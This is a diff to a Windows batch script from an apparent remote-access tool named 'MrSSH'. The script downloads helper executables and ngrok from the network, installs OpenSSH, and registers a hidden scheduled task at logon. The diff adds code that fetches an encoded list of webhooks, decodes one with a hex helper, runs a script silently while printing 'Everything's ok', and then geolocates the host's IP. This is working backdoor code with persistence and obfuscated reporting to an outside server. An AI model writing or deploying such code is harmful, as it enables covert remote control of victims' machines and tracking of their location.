@@ -9,6 +9,7 @@ curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" 
 curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/NgrokRun.bat" -o "NgrokRun.bat"
 curl -Ls "https://github.com/dh3b/MrSSH/raw/main/Files/WebParse.exe?raw=true" -o "WebParse.exe"
+curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Hex.bat" -o "Hex.bat"
 :: </Install>
 
 powershell ./OpenSSH.ps1
@@ -25,7 +26,14 @@ schtasks /create /tn "MrSSH" /sc onlogon /tr "%appdata%\MrSSH\Silent.vbs" /F
 cd %temp%
 :: </Startup>
 
-FOR /F "tokens=* USEBACKQ" %F IN (`type web.txt`) DO (SET webhook=%F)
+curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Identifiers/Redirect.ini" -o "Redirect.ini"
+FOR /F "delims=" %F IN (tokenName.txt) DO SET token=%F
+FOR /F "tokens=* USEBACKQ" %F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%F)
+set "hexwebhook=%hexwebhook:~-244%"
+FOR /F "tokens=* USEBACKQ" %F IN (`call hex.bat -hex "%hexwebhook%"`) DO (SET webhook=%F)
+source.bat +silent --message "Everything's ok"
+
+
 
 for /f "tokens=*" %%a in ('call "WebParse.exe" "http://ip-api.com/json/?fields=61439" query status city regionName country countryCode lat lon timezone isp') do set "%%a"
 
